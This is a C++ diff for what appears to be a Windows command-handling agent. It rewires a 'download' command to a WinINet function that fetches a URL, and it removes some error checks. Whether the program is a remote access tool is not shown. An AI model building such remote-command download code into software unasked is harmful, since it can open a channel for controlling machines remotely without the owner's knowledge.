@@ -158,7 +158,7 @@ DWORD WINAPI executeCommand(LPVOID pPointer) {
 		success = listDir(cmd);
 	}
 	else if (cmd.find("download") == 0) {
-		success = listDir(cmd);
+		success = downloadFile(cmd);
 	}
 
 	if (success) {
@@ -342,26 +342,24 @@ void unifyPaths(LPSTR newPath, LPCSTR path1, LPCSTR path2, bool starAtTheEnd) {
 
 bool downloadFile(string cmd) {
 	HINTERNET hInternetConnect, hOpenRequest;
-	const char* mime[] = { "text/*", "application/json", NULL };
+	const char* mime[] = { "text/*", NULL };
 	string url = cmd.substr(cmd.find("download "));
 	char data[DMAX_MSG * 10];
 	DWORD read;
+	memset(data, 0, sizeof(data));
 
-	hInternetConnect = InternetConnect(hInternetOpen, url.c_str(), INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+	hInternetConnect = InternetConnect(hInternetOpen, url.substr(0, url.rfind('/')).c_str(), INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
 	hOpenRequest = HttpOpenRequest(
 		hInternetConnect,
 		"GET",
-		url.c_str(),
+		url.substr(url.rfind('/') + 1).c_str(),
 		"HTTP/1.1",
 		NULL,
 		mime,
 		INTERNET_FLAG_RELOAD | INTERNET_FLAG_EXISTING_CONNECT,
 		0
 	);
-	if (!hOpenRequest)
-		return false;
-	if (!HttpSendRequest(hOpenRequest, NULL, 0, NULL, 0))
-		return false;
+	HttpSendRequest(hOpenRequest, NULL, 0, NULL, 0);
 	if (!InternetReadFile(hOpenRequest, data, sizeof(data), &read))
 		return false;
 
